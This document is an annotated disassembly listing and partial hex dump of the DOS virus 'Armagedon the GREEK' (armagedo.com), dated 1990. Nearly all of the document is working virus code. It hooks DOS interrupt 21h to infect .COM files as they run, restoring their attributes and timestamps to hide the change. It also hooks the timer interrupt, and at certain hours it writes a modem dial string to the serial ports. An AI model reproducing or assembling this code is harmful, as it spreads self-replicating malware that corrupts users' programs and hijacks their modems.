                ;==========================================================================
                ;==                 ARMAGEDO                     ==
                ;==      Created:   31-May-90                            ==
                ;==      Version:                                ==
                ;==      Passes:    9          Analysis Options on: BIOQRSUW             ==
                ;==========================================================================

     0100           START:
     0100  E9 0333              JMP LOC_36          ; (0436)

                ;==========================================================================
                ;           External Entry Point
                ;==========================================================================

     0103           INT_21H_ENTRY   PROC    FAR
     0103 .9C                   PUSHF               ; Push flags
     0104  80 FC E0             CMP AH,0E0H
     0107  75 05                JNE LOC_2           ; Jump if not equal
     0109  B8 DADA              MOV AX,0DADAH
     010C  9D                   POPF                ; Pop flags
     010D  CF                   IRET                ; Interrupt return
     010E           LOC_2:                      ;  xref 8978:0107
     010E  80 FC E1             CMP AH,0E1H
     0111  75 04                JNE LOC_3           ; Jump if not equal
     0113  8C C8                MOV AX,CS
     0115  9D                   POPF                ; Pop flags
     0116  CF                   IRET                ; Interrupt return
     0117           LOC_3:                      ;  xref 8978:0111
     0117  3D 4B00              CMP AX,4B00H
     011A  74 40                JE  LOC_5           ; Jump if equal
     011C           LOC_4:                      ;  xref 8978:0306
     011C  9D                   POPF                ; Pop flags
     011D  2E: FF 2E 0122           JMP DWORD PTR CS:DATA_6 ; (8978:0122=138DH)

     0122  138D 029A        DATA_6      DD  29A138DH        ;  xref 8978:011D, 0449, 04C1
     0126  022B 0070        DATA_8      DD  70022BH         ;  xref 8978:0313, 045E
     012A  00           DATA_10     DB  0           ;  xref 8978:032D, 0338, 0350
     012B  08           DATA_11     DB  8           ;  xref 8978:0369, 0396, 039A
     012C  10           DATA_12     DB  10H         ;  xref 8978:031F, 0384, 038D, 03AB
                                        ;            0472
     012D  09           DATA_13     DB  9           ;  xref 8978:037B, 0390, 03A5, 0476
     012E  34           DATA_14     DB  34H         ;  xref 8978:0372, 0393, 039F, 047A
     012F  0000         DATA_15     DW  0           ;  xref 8978:0342, 0346, 0354
     0131  00                   DB  0
     0132  00           DATA_16     DB  0           ;  xref 8978:03F3, 0413, 042D
     0133  0000         DATA_17     DW  0           ; Data table (indexed access)
                                        ;  xref 8978:0357, 03CB, 042A
     0135  43 4F 4D             DB   43H, 4FH, 4DH
     0138  0005         DATA_19     DW  5           ;  xref 8978:020F, 0255, 027C, 02A7
                                        ;            02BA, 02C4
     013A  0002         DATA_20     DW  2           ;  xref 8978:0226, 029E, 04ED
     013C  00 00                DB  0, 0
     013E  1301         DATA_21     DW  1301H           ;  xref 8978:01F4, 0216, 026A, 028D
                                        ;            02D6
     0140  12AC         DATA_22     DW  12ACH           ;  xref 8978:04B6, 04C6
     0142  FFFE         DATA_23     DW  0FFFEH          ;  xref 8978:04BB, 04CC
     0144  9B70         DATA_24     DW  9B70H           ;  xref 8978:01CE, 02E0
     0146  3D5B         DATA_25     DW  3D5BH           ;  xref 8978:01D3, 02E6
     0148  0020         DATA_26     DW  20H         ;  xref 8978:01DD, 02EE
     014A  0EC2         DATA_27     DW  0EC2H           ;  xref 8978:0288, 02B5
     014C  6E68         DATA_28     DW  6E68H           ;  xref 8978:0283, 02B0
     014E  00 00 81 00              DB   00H, 00H, 81H, 00H
     0152  12AC         DATA_29     DW  12ACH           ;  xref 8978:04AF
     0154  5C 00                DB   5CH, 00H
     0156  12AC         DATA_30     DW  12ACH           ;  xref 8978:04A7
     0158  6C 00                DB   6CH, 00H
     015A  12AC         DATA_31     DW  12ACH           ;  xref 8978:04AB

     015C           LOC_5:                      ;  xref 8978:011A
     015C  1E                   PUSH    DS
     015D  53                   PUSH    BX
     015E  56                   PUSH    SI
     015F  51                   PUSH    CX
     0160  50                   PUSH    AX
     0161  52                   PUSH    DX
     0162  55                   PUSH    BP
     0163  06                   PUSH    ES
     0164  57                   PUSH    DI
     0165  FC                   CLD             ; Clear direction
     0166  52                   PUSH    DX
     0167  1E                   PUSH    DS
     0168  33 C9                XOR CX,CX           ; Zero register
     016A  8B F2                MOV SI,DX
     016C           LOC_6:                      ;  xref 8978:0174
     016C  8A 04                MOV AL,[SI]
     016E  3C 00                CMP AL,0
     0170  74 04                JE  LOC_7           ; Jump if equal
     0172  41                   INC CX
     0173  46                   INC SI
     0174  EB F6                JMP SHORT LOC_6     ; (016C)
     0176           LOC_7:                      ;  xref 8978:0170
     0176  03 D1                ADD DX,CX
     0178  83 EA 03             SUB DX,3
     017B  BE 0135              MOV SI,135H
     017E  8B FA                MOV DI,DX
     0180  80 7D FD 4E              CMP BYTE PTR DS:DATA_32E[DI],4EH    ; (8978:FFFD=0) 'N'
     0184  75 06                JNE LOC_8           ; Jump if not equal
     0186  80 7D FE 44              CMP BYTE PTR DS:DATA_33E[DI],44H    ; (8978:FFFE=0) 'D'
     018A  74 2D                JE  LOC_11          ; Jump if equal
     018C           LOC_8:                      ;  xref 8978:0184
     018C  B9 0003              MOV CX,3

     018F           LOCLOOP_9:                  ;  xref 8978:0198
     018F  2E: 8A 04                MOV AL,CS:[SI]
     0192  3A 05                CMP AL,[DI]
     0194  75 23                JNE LOC_11          ; Jump if not equal
     0196  46                   INC SI
     0197  47                   INC DI
     0198  E2 F5                LOOP    LOCLOOP_9       ; Loop if cx > 0

     019A  1F                   POP DS
     019B  5A                   POP DX
     019C  52                   PUSH    DX
     019D  1E                   PUSH    DS
     019E  8B F2                MOV SI,DX
     01A0  B2 00                MOV DL,0
     01A2  80 7C 01 3A              CMP BYTE PTR DS:DATA_1E[SI],3AH ; (0000:0001=56H) ':'
     01A6  75 05                JNE LOC_10          ; Jump if not equal
     01A8  8A 14                MOV DL,[SI]
     01AA  80 E2 0F             AND DL,0FH
     01AD           LOC_10:                     ;  xref 8978:01A6
     01AD  B4 36                MOV AH,36H          ; '6'
     01AF  CD 21                INT 21H         ; DOS Services  ah=function 36h
                                        ;  get free space, drive dl,1=a:
     01B1  3D FFFF              CMP AX,0FFFFH
     01B4  74 03                JE  LOC_11          ; Jump if equal
     01B6  EB 0D                JMP SHORT LOC_13        ; (01C5)
     01B8  90                   DB  90H
     01B9           LOC_11:                     ;  xref 8978:018A, 0194, 01B4, 01C8
     01B9  E9 013C              JMP LOC_19          ; (02F8)
     01BC  E9 013E              JMP LOC_20          ; (02FD)
     01BF           LOC_12:                     ;  xref 8978:020B, 0224, 022D
     01BF  E9 0102              JMP LOC_17          ; (02C4)
     01C2  E9 010A              JMP LOC_18          ; (02CF)
     01C5           LOC_13:                     ;  xref 8978:01B6
     01C5  83 FB 03             CMP BX,3
     01C8  72 EF                JB  LOC_11          ; Jump if below
     01CA  1F                   POP DS
     01CB  5A                   POP DX
     01CC  1E                   PUSH    DS
     01CD  52                   PUSH    DX
     01CE  2E: 8C 1E 0144           MOV CS:DATA_24,DS       ; (8978:0144=9B70H)
     01D3  2E: 89 16 0146           MOV CS:DATA_25,DX       ; (8978:0146=3D5BH)
     01D8  B8 4300              MOV AX,4300H
     01DB  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     01DD  2E: 89 0E 0148           MOV CS:DATA_26,CX       ; (8978:0148=20H)
     01E2  B8 4301              MOV AX,4301H
     01E5  33 C9                XOR CX,CX           ; Zero register
     01E7  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     01E9  BB FFFF              MOV BX,0FFFFH
     01EC  B4 48                MOV AH,48H          ; 'H'
     01EE  CD 21                INT 21H         ; DOS Services  ah=function 48h
                                        ;  allocate memory, bx=bytes/16
     01F0  B4 48                MOV AH,48H          ; 'H'
     01F2  CD 21                INT 21H         ; DOS Services  ah=function 48h
                                        ;  allocate memory, bx=bytes/16
     01F4  2E: A3 013E              MOV CS:DATA_21,AX       ; (8978:013E=1301H)
     01F8  8C C8                MOV AX,CS
     01FA  8E D8                MOV DS,AX
     01FC  BA 0541              MOV DX,541H
     01FF  B4 1A                MOV AH,1AH
     0201  CD 21                INT 21H         ; DOS Services  ah=function 1Ah
                                        ;  set DTA to ds:dx
     0203  5A                   POP DX
     0204  1F                   POP DS
     0205  B8 3D02              MOV AX,3D02H
     0208  F8                   CLC             ; Clear carry flag
     0209  CD 21                INT 21H         ; DOS Services  ah=function 3Dh
                                        ;  open file, al=mode,name@ds:dx
     020B  72 B2                JC  LOC_12          ; Jump if carry Set
     020D  8B D8                MOV BX,AX
     020F  2E: A3 0138              MOV CS:DATA_19,AX       ; (8978:0138=5)
     0213  B9 FFFF              MOV CX,0FFFFH
     0216  2E: A1 013E              MOV AX,CS:DATA_21       ; (8978:013E=1301H)
     021A  8E D8                MOV DS,AX
     021C  BA 0437              MOV DX,437H
     021F  B4 3F                MOV AH,3FH          ; '?'
     0221  F8                   CLC             ; Clear carry flag
     0222  CD 21                INT 21H         ; DOS Services  ah=function 3Fh
                                        ;  read file, cx=bytes, to ds:dx
     0224  72 99                JC  LOC_12          ; Jump if carry Set
     0226  2E: A3 013A              MOV CS:DATA_20,AX       ; (8978:013A=2)
     022A  3D E000              CMP AX,0E000H
     022D  77 90                JA  LOC_12          ; Jump if above
     022F  3D 0437              CMP AX,437H
     0232  72 1E                JB  LOC_15          ; Jump if below
     0234  BE 0438              MOV SI,438H
     0237  03 F6                ADD SI,SI
     0239  83 EE 15             SUB SI,15H
     023C  B9 0013              MOV CX,13H
     023F  BF 0524              MOV DI,524H

     0242           LOCLOOP_14:                 ;  xref 8978:024D
     0242  8A 04                MOV AL,[SI]
     0244  2E: 8A 25                MOV AH,CS:[DI]
     0247  3A E0                CMP AH,AL
     0249  75 07                JNE LOC_15          ; Jump if not equal
     024B  46                   INC SI
     024C  47                   INC DI
     024D  E2 F3                LOOP    LOCLOOP_14      ; Loop if cx > 0

     024F  EB 73                JMP SHORT LOC_17        ; (02C4)
     0251  90                   DB  90H
     0252           LOC_15:                     ;  xref 8978:0232, 0249
     0252  B8 4200              MOV AX,4200H
     0255  2E: 8B 1E 0138           MOV BX,CS:DATA_19       ; (8978:0138=5)
     025A  33 C9                XOR CX,CX           ; Zero register
     025C  8B D1                MOV DX,CX
     025E  CD 21                INT 21H         ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
     0260  72 62                JC  LOC_17          ; Jump if carry Set
     0262  BE 0100              MOV SI,100H
     0265  B9 0437              MOV CX,437H
     0268  33 FF                XOR DI,DI           ; Zero register
     026A  2E: A1 013E              MOV AX,CS:DATA_21       ; (8978:013E=1301H)
     026E  8E D8                MOV DS,AX

     0270           LOCLOOP_16:                 ;  xref 8978:0277
     0270  2E: 8A 04                MOV AL,CS:[SI]
     0273  88 05                MOV [DI],AL
     0275  46                   INC SI
     0276  47                   INC DI
     0277  E2 F7                LOOP    LOCLOOP_16      ; Loop if cx > 0

     0279  B8 5700              MOV AX,5700H
     027C  2E: 8B 1E 0138           MOV BX,CS:DATA_19       ; (8978:0138=5)
     0281  CD 21                INT 21H         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
     0283  2E: 89 0E 014C           MOV CS:DATA_28,CX       ; (8978:014C=6E68H)
     0288  2E: 89 16 014A           MOV CS:DATA_27,DX       ; (8978:014A=0EC2H)
     028D  2E: A1 013E              MOV AX,CS:DATA_21       ; (8978:013E=1301H)
     0291  8E D8                MOV DS,AX
     0293  BE 0437              MOV SI,437H
     0296  8A 04                MOV AL,[SI]
     0298  04 0B                ADD AL,0BH
     029A  88 04                MOV [SI],AL
     029C  33 D2                XOR DX,DX           ; Zero register
     029E  2E: 8B 0E 013A           MOV CX,CS:DATA_20       ; (8978:013A=2)
     02A3  81 C1 0437               ADD CX,437H
     02A7  2E: 8B 1E 0138           MOV BX,CS:DATA_19       ; (8978:0138=5)
     02AC  B4 40                MOV AH,40H          ; '@'
     02AE  CD 21                INT 21H         ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
     02B0  2E: 8B 0E 014C           MOV CX,CS:DATA_28       ; (8978:014C=6E68H)
     02B5  2E: 8B 16 014A           MOV DX,CS:DATA_27       ; (8978:014A=0EC2H)
     02BA  2E: 8B 1E 0138           MOV BX,CS:DATA_19       ; (8978:0138=5)
     02BF  B8 5701              MOV AX,5701H
     02C2  CD 21                INT 21H         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
     02C4           LOC_17:                     ;  xref 8978:01BF, 024F, 0260
     02C4  2E: 8B 1E 0138           MOV BX,CS:DATA_19       ; (8978:0138=5)
     02C9  B4 3E                MOV AH,3EH          ; '>'
     02CB  CD 21                INT 21H         ; DOS Services  ah=function 3Eh
                                        ;  close file, bx=file handle
     02CD  0E                   PUSH    CS
     02CE  1F                   POP DS
     02CF           LOC_18:                     ;  xref 8978:01C2
     02CF  BA 0080              MOV DX,80H
     02D2  B4 1A                MOV AH,1AH
     02D4  CD 21                INT 21H         ; DOS Services  ah=function 1Ah
                                        ;  set DTA to ds:dx
     02D6  2E: A1 013E              MOV AX,CS:DATA_21       ; (8978:013E=1301H)
     02DA  8E C0                MOV ES,AX
     02DC  B4 49                MOV AH,49H          ; 'I'
     02DE  CD 21                INT 21H         ; DOS Services  ah=function 49h
                                        ;  release memory block, es=seg
     02E0  2E: A1 0144              MOV AX,CS:DATA_24       ; (8978:0144=9B70H)
     02E4  8E D8                MOV DS,AX
     02E6  2E: 8B 16 0146           MOV DX,CS:DATA_25       ; (8978:0146=3D5BH)
     02EB  B8 4301              MOV AX,4301H
     02EE  2E: 8B 0E 0148           MOV CX,CS:DATA_26       ; (8978:0148=20H)
     02F3  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     02F5  EB 06                JMP SHORT LOC_20        ; (02FD)
     02F7  90                   DB  90H
     02F8           LOC_19:                     ;  xref 8978:01B9
     02F8  1F                   POP DS
     02F9  5A                   POP DX
     02FA  EB 01                JMP SHORT LOC_20        ; (02FD)
     02FC  90                   DB  90H
     02FD           LOC_20:                     ;  xref 8978:01BC, 02F5, 02FA
     02FD  5F                   POP DI
     02FE  07                   POP ES
     02FF  5D                   POP BP
     0300  5A                   POP DX
     0301  58                   POP AX
     0302  59                   POP CX
     0303  5E                   POP SI
     0304  5B                   POP BX
     0305  1F                   POP DS
     0306  E9 FE13              JMP LOC_4           ; (011C)

                ;==========================================================================
                ;           External Entry Point
                ;==========================================================================

     0309           INT_08H_ENTry   PROC    FAR
     0309  55                   PUSH    BP
     030A  1E                   PUSH    DS
     030B  06                   PUSH    ES
     030C  50                   PUSH    AX
     030D  53                   PUSH    BX
     030E  51                   PUSH    CX
     030F  52                   PUSH    DX
     0310  56                   PUSH    SI
     0311  57                   PUSH    DI
     0312  9C                   PUSHF               ; Push flags
     0313  2E: FF 1E 0126           CALL    CS:DATA_8       ; (8978:0126=22BH)
     0318  E8 004A              CALL    SUB_1           ; (0365)
     031B  0E                   PUSH    CS
     031C  1F                   POP DS
     031D  B4 05                MOV AH,5
     031F  8A 2E 012C               MOV CH,DATA_12      ; (8978:012C=10H)
     0323  3A E5                CMP AH,CH
     0325  77 34                JA  LOC_22          ; Jump if above
     0327  B4 06                MOV AH,6
     0329  3A E5                CMP AH,CH
     032B  72 2E                JB  LOC_22          ; Jump if below
     032D  8A 26 012A               MOV AH,DATA_10      ; (8978:012A=0)
     0331  80 FC 01             CMP AH,1
     0334  74 09                JE  LOC_21          ; Jump if equal
     0336  B4 01                MOV AH,1
     0338  88 26 012A               MOV DATA_10,AH      ; (8978:012A=0)
     033C  EB 1D                JMP SHORT LOC_22        ; (035B)
     033E  90                   DB  90H
     033F           LOC_21:                     ;  xref 8978:0334
     033F  E8 0089              CALL    SUB_2           ; (03CB)
     0342  FF 06 012F               INC DATA_15         ; (8978:012F=0)
     0346  A1 012F              MOV AX,DATA_15      ; (8978:012F=0)
     0349  3D 021C              CMP AX,21CH
     034C  75 0D                JNE LOC_22          ; Jump if not equal
     034E  33 C0                XOR AX,AX           ; Zero register
     0350  88 26 012A               MOV DATA_10,AH      ; (8978:012A=0)
     0354  A3 012F              MOV DATA_15,AX      ; (8978:012F=0)
     0357  88 26 0133               MOV BYTE PTR DATA_17,AH ; (8978:0133=0)
     035B           LOC_22:                     ;  xref 8978:0325, 032B, 033C, 034C
     035B  5F                   POP DI
     035C  5E                   POP SI
     035D  5A                   POP DX
     035E  59                   POP CX
     035F  5B                   POP BX
     0360  58                   POP AX
     0361  07                   POP ES
     0362  1F                   POP DS
     0363  5D                   POP BP
     0364  CF                   IRET                ; Interrupt return
                INT_08H_ENTry   ENDP

                ;==========================================================================
                ;                  SUBROUTINE
                ;         Called from:   8978:0318
                ;==========================================================================

                SUB_1       PROC    NEAR
     0365  0E                   PUSH    CS
     0366  1F                   POP DS
     0367  32 C0                XOR AL,AL           ; Zero register
     0369  8A 26 012B               MOV AH,DATA_11      ; (8978:012B=8)
     036D  80 FC 11             CMP AH,11H
     0370  75 28                JNE LOC_26          ; Jump if not equal
     0372  8A 26 012E               MOV AH,DATA_14      ; (8978:012E=34H)
     0376  80 FC 3B             CMP AH,3BH          ; ';'
     0379  75 24                JNE LOC_27          ; Jump if not equal
     037B  8A 26 012D               MOV AH,DATA_13      ; (8978:012D=9)
     037F  80 FC 3B             CMP AH,3BH          ; ';'
     0382  75 21                JNE LOC_28          ; Jump if not equal
     0384  8A 26 012C               MOV AH,DATA_12      ; (8978:012C=10H)
     0388  80 FC 17             CMP AH,17H
     038B  75 1E                JNE LOC_29          ; Jump if not equal
     038D  A2 012C              MOV DATA_12,AL      ; (8978:012C=10H)
     0390           LOC_23:                     ;  xref 8978:03AF
     0390  A2 012D              MOV DATA_13,AL      ; (8978:012D=9)
     0393           LOC_24:                     ;  xref 8978:03A9
     0393  A2 012E              MOV DATA_14,AL      ; (8978:012E=34H)
     0396           LOC_25:                     ;  xref 8978:03A3
     0396  A2 012B              MOV DATA_11,AL      ; (8978:012B=8)
     0399  C3                   RETN
     039A           LOC_26:                     ;  xref 8978:0370
     039A  FE 06 012B               INC DATA_11         ; (8978:012B=8)
     039E  C3                   RETN
     039F           LOC_27:                     ;  xref 8978:0379
     039F  FE 06 012E               INC DATA_14         ; (8978:012E=34H)
     03A3  EB F1                JMP SHORT LOC_25        ; (0396)
     03A5           LOC_28:                     ;  xref 8978:0382
     03A5  FE 06 012D               INC DATA_13         ; (8978:012D=9)
     03A9  EB E8                JMP SHORT LOC_24        ; (0393)
     03AB           LOC_29:                     ;  xref 8978:038B
     03AB  FE 06 012C               INC DATA_12         ; (8978:012C=10H)
     03AF  EB DF                JMP SHORT LOC_23        ; (0390)
                SUB_1       ENDP

     03B1  2B 2B 2B 61 54 68            DB  '+++aTh0m0s7=35dp081,,,,141'
     03B7  30 6D 30 73 37 3D
     03BD  33 35 64 70 30 38
     03C3  31 2C 2C 2C 2C 31
     03C9  34 31

                ;==========================================================================
                ;                  SUBROUTINE
                ;         Called from:   8978:033F
                ;==========================================================================

                SUB_2       PROC    NEAR
     03CB  A0 0133              MOV AL,BYTE PTR DATA_17 ; (8978:0133=0)
     03CE  3C 01                CMP AL,1
     03D0  74 63                JE  LOC_RET_35      ; Jump if equal
     03D2  A0 0134              MOV AL,BYTE PTR DATA_17+1   ; (8978:0134=0)
     03D5  3C 01                CMP AL,1
     03D7  74 15                JE  LOC_31          ; Jump if equal
     03D9  B9 0003              MOV CX,3

     03DC           LOCLOOP_30:                 ;  xref 8978:03E4
     03DC  8B D1                MOV DX,CX
     03DE  32 E4                XOR AH,AH           ; Zero register
     03E0  B0 83                MOV AL,83H
     03E2  CD 14                INT 14H         ; RS-232   dx=com4, ah=func 00h
                                        ;  reset port, al=init parameter
     03E4  E2 F6                LOOP    LOCLOOP_30      ; Loop if cx > 0

     03E6  B0 01                MOV AL,1
     03E8  A2 0134              MOV BYTE PTR DATA_17+1,AL   ; (8978:0134=0)
     03EB  EB 48                JMP SHORT LOC_RET_35    ; (0435)
     03ED  90                   DB  90H
     03EE           LOC_31:                     ;  xref 8978:03D7
     03EE  0E                   PUSH    CS
     03EF  1F                   POP DS
     03F0  BE 03B1              MOV SI,3B1H
     03F3  A0 0132              MOV AL,DATA_16      ; (8978:0132=0)
     03F6  3C 1A                CMP AL,1AH
     03F8  75 03                JNE LOC_32          ; Jump if not equal
     03FA  EB 1E                JMP SHORT LOC_33        ; (041A)
     03FC  90                   DB  90H
     03FD           LOC_32:                     ;  xref 8978:03F8
     03FD  32 E4                XOR AH,AH           ; Zero register
     03FF  03 F0                ADD SI,AX
     0401  8A 04                MOV AL,[SI]
     0403  BA 03F8              MOV DX,3F8H
     0406  EE                   OUT DX,AL           ; port 3F8H, RS232-1 xmit buffr
     0407  BA 02F8              MOV DX,2F8H
     040A  EE                   OUT DX,AL           ; port 2F8H, RS232-2 xmit buffr
     040B  BA 02E8              MOV DX,2E8H
     040E  EE                   OUT DX,AL           ; port 2E8H, 8514 Horiz total
     040F  BA 03E8              MOV DX,3E8H
     0412  EE                   OUT DX,AL           ; port 3E8H
     0413  FE 06 0132               INC DATA_16         ; (8978:0132=0)
     0417  EB 1C                JMP SHORT LOC_RET_35    ; (0435)
     0419  90                   DB  90H
     041A           LOC_33:                     ;  xref 8978:03FA
     041A  B9 0003              MOV CX,3

     041D           LOCLOOP_34:                 ;  xref 8978:0425
     041D  8B D1                MOV DX,CX
     041F  B0 0D                MOV AL,0DH
     0421  B4 01                MOV AH,1
     0423  CD 14                INT 14H         ; RS-232   dx=com4, ah=func 01h
                                        ;  write char al, ah=retn status
     0425  E2 F6                LOOP    LOCLOOP_34      ; Loop if cx > 0

     0427  B8 0001              MOV AX,1
     042A  A2 0133              MOV BYTE PTR DATA_17,AL ; (8978:0133=0)
     042D  88 26 0132               MOV DATA_16,AH      ; (8978:0132=0)
     0431  88 26 0134               MOV BYTE PTR DATA_17+1,AH   ; (8978:0134=0)

     0435           LOC_RET_35:                 ;  xref 8978:03D0, 03EB, 0417
     0435  C3                   RETN
                SUB_2       ENDP

     0436           LOC_36:                     ;  xref 8978:0100
     0436  B4 E0                MOV AH,0E0H
     0438  CD 21                INT 21H         ; DOS Services  ah=function E0h
     043A  3D DADA              CMP AX,0DADAH
     043D  75 03                JNE LOC_37          ; Jump if not equal
     043F  E9 0099              JMP LOC_40          ; (04DB)
     0442           LOC_37:                     ;  xref 8978:043D
     0442  0E                   PUSH    CS
     0443  1F                   POP DS
     0444  B8 3521              MOV AX,3521H
     0447  CD 21                INT 21H         ; DOS Services  ah=function 35h
                                        ;  get intrpt vector al in es:bx
     0449  89 1E 0122               MOV WORD PTR DATA_6,BX  ; (8978:0122=138DH)
     044D  8C 06 0124               MOV WORD PTR DATA_6+2,ES    ; (8978:0124=29AH)
     0451  BA 0103              MOV DX,103H
     0454  B8 2521              MOV AX,2521H
     0457  CD 21                INT 21H         ; DOS Services  ah=function 25h
                                        ;  set intrpt vector al to ds:dx
     0459  B8 3508              MOV AX,3508H
     045C  CD 21                INT 21H         ; DOS Services  ah=function 35h
                                        ;  get intrpt vector al in es:bx
     045E  89 1E 0126               MOV WORD PTR DATA_8,BX  ; (8978:0126=22BH)
     0462  8C 06 0128               MOV WORD PTR DATA_8+2,ES    ; (8978:0128=70H)
     0466  BA 0309              MOV DX,309H
     0469  B8 2508              MOV AX,2508H
     046C  CD 21                INT 21H         ; DOS Services  ah=function 25h
                                        ;  set intrpt vector al to ds:dx
     046E  B4 2C                MOV AH,2CH          ; ','
     0470  CD 21                INT 21H         ; DOS Services  ah=function 2Ch
                                        ;  get time, cx=hrs/min, dh=sec
     0472  88 2E 012C               MOV DATA_12,CH      ; (8978:012C=10H)
     0476  88 0E 012D               MOV DATA_13,CL      ; (8978:012D=9)
     047A  88 36 012E               MOV DATA_14,DH      ; (8978:012E=34H)
     047E  2E: A1 002C              MOV AX,CS:DATA_4E       ; (8978:002C=0)
     0482  8E D8                MOV DS,AX
     0484  33 F6                XOR SI,SI           ; Zero register
     0486           LOC_38:                     ;  xref 8978:048D
     0486  8A 04                MOV AL,[SI]
     0488  3C 01                CMP AL,1
     048A  74 03                JE  LOC_39          ; Jump if equal
     048C  46                   INC SI
     048D  EB F7                JMP SHORT LOC_38        ; (0486)
     048F           LOC_39:                     ;  xref 8978:048A
     048F  46                   INC SI
     0490  46                   INC SI
     0491  8B D6                MOV DX,SI
     0493  8C C8                MOV AX,CS
     0495  8E C0                MOV ES,AX
     0497  BB 005A              MOV BX,5AH
     049A  B4 4A                MOV AH,4AH          ; 'J'
     049C  CD 21                INT 21H         ; DOS Services  ah=function 4Ah
                                        ;  change mem allocation, bx=siz
     049E  2E: 8B 1E 0081           MOV BX,CS:PSP_CMD_TAIL  ; (8978:0081=0)
     04A3  8C C8                MOV AX,CS
     04A5  8E C0                MOV ES,AX
     04A7  2E: A3 0156              MOV CS:DATA_30,AX       ; (8978:0156=12ACH)
     04AB  2E: A3 015A              MOV CS:DATA_31,AX       ; (8978:015A=12ACH)
     04AF  2E: A3 0152              MOV CS:DATA_29,AX       ; (8978:0152=12ACH)
     04B3  B8 4B00              MOV AX,4B00H
     04B6  2E: 8C 16 0140           MOV CS:DATA_22,SS       ; (8978:0140=12ACH)
     04BB  2E: 89 26 0142           MOV CS:DATA_23,SP       ; (8978:0142=0FFFEH)
     04C0  9C                   PUSHF               ; Push flags
     04C1  2E: FF 1E 0122           CALL    CS:DATA_6       ; (8978:0122=138DH)
     04C6  2E: A1 0140              MOV AX,CS:DATA_22       ; (8978:0140=12ACH)
     04CA  8E D0                MOV SS,AX
     04CC  2E: A1 0142              MOV AX,CS:DATA_23       ; (8978:0142=0FFFEH)
     04D0  8B E0                MOV SP,AX
     04D2  8C C8                MOV AX,CS
     04D4  8E D8                MOV DS,AX
     04D6  BA 0537              MOV DX,537H
     04D9  CD 27                INT 27H         ; Terminate & stay resident
     04DB           LOC_40:                     ;  xref 8978:043F
     04DB  B4 E1                MOV AH,0E1H
     04DD  CD 21                INT 21H         ; DOS Services  ah=function E1h
     04DF  BE 04F3              MOV SI,4F3H
     04E2  2E: 89 44 03             MOV CS:DATA_3E[SI],AX   ; (8978:0003=0)
     04E6  B8 04F8              MOV AX,4F8H
     04E9  2E: 89 44 01             MOV CS:DATA_2E[SI],AX   ; (8978:0001=0)
     04ED  2E: A1 013A              MOV AX,CS:DATA_20       ; (8978:013A=2)
     04F1  8C CB                MOV BX,CS
     04F3  EA 0000:0000     ;*      JMP FAR PTR LOC_1       ; (0000:0000)

     04F8  8B C8                MOV CX,AX
     04FA  8E DB                MOV DS,BX
     04FC  BE 0100              MOV SI,100H
     04FF  BF 0537              MOV DI,537H

     0502           LOCLOOP_41:                 ;  xref 8978:0508
     0502  8A 05                MOV AL,[DI]
     0504  88 04                MOV [SI],AL
     0506  46                   INC SI
     0507  47                   INC DI
     0508  E2 F8                LOOP    LOCLOOP_41      ; Loop if cx > 0

     050A  BE 051F              MOV SI,51FH
     050D  2E: 8C 5C 03             MOV CS:DATA_3E[SI],DS   ; (8978:0003=0)
     0511  A0 0100              MOV AL,BYTE PTR DS:[100H]   ; (8978:0100=0E9H)
     0514  2C 0B                SUB AL,0BH
     0516  A2 0100              MOV BYTE PTR DS:[100H],AL   ; (8978:0100=0E9H)
     0519  8C D8                MOV AX,DS
     051B  8E C0                MOV ES,AX
     051D  8E D0                MOV SS,AX
     051F  EA 8978:0100             JMP FAR PTR START       ; (0100)

     0524  41 72 6D 61 67 65            DB  'Armagedon the GREEK'
     052A  64 6F 6E 20 74 68
     0530  65 20 47 52 45 45
     0536  4B
     0537  D8 20                DB  0D8H, 20H

                SEG_A       ENDS
                        END START


---------------------------------------------------------------
| Dump Mader   Ver 2.2               Wed Jan 09 10:02:59 1991 |
---------------------------------------------------------------

Dumping file : armagedo.com
               1081 bytes length
               16:9:16  31-5-1990  created (modifyed)

0100:   E933039C 80FCE075  05B8DADA 9DCF80FC   E175048C C89DCF3D  004B7440 9D2EFF2E   ".3.....u.........u.....=.Kt@...."
0120:   22018D13 9A022B02  70000008 10093400   00000000 00434F4D  05000200 00000113   "".....+.p.....4......COM........"
0140:   AC12FEFF 709B5B3D  2000C20E 686E0000   8100AC12 5C00AC12  6C00AC12 1E535651   "....p.[= ...hn......\...l....SVQ"
0160:   50525506 57FC521E  33C98BF2 8A043C00   74044146 EBF603D1  83EA03BE 35018BFA   "PRU.W.R.3.....<.t.AF........5..."
0180:   807DFD4E 7506807D  FE44742D B903002E   8A043A05 75234647  E2F51F5A 521E8BF2   ".}.Nu..}.Dt-......:.u#FG...ZR..."
01A0:   B200807C 013A7505  8A1480E2 0FB436CD   213DFFFF 7403EB0D  90E93C01 E93E01E9   "...|.:u.......6.!=..t.....<..>.."
01C0:   0201E90A 0183FB03  72EF1F5A 1E522E8C   1E44012E 89164601  B80043CD 212E890E   "........r..Z.R...D....F...C.!..."
01E0:   4801B801 4333C9CD  21BBFFFF B448CD21   B448CD21 2EA33E01  8CC88ED8 BA4105B4   "H...C3..!....H.!.H.!..>......A.."
0200:   1ACD215A 1FB8023D  F8CD2172 B28BD82E   A33801B9 FFFF2EA1  3E018ED8 BA3704B4   "..!Z...=..!r.....8......>....7.."
0220:   3FF8CD21 72992EA3  3A013D00 E077903D   3704721E BE380403  F683EE15 B91300BF   "?..!r...:.=..w.=7.r..8.........."
0240:   24058A04 2E8A253A  E0750746 47E2F3EB   7390B800 422E8B1E  380133C9 8BD1CD21   "$.....%:.u.FG...s...B...8.3....!"
0260:   7262BE00 01B93704  33FF2EA1 3E018ED8   2E8A0488 054647E2  F7B80057 2E8B1E38   "rb....7.3...>........FG....W...8"
0280:   01CD212E 890E4C01  2E89164A 012EA13E   018ED8BE 37048A04  040B8804 33D22E8B   "..!...L....J...>....7.......3..."
02A0:   0E3A0181 C137042E  8B1E3801 B440CD21   2E8B0E4C 012E8B16  4A012E8B 1E3801B8   ".:...7....8..@.!...L....J....8.."
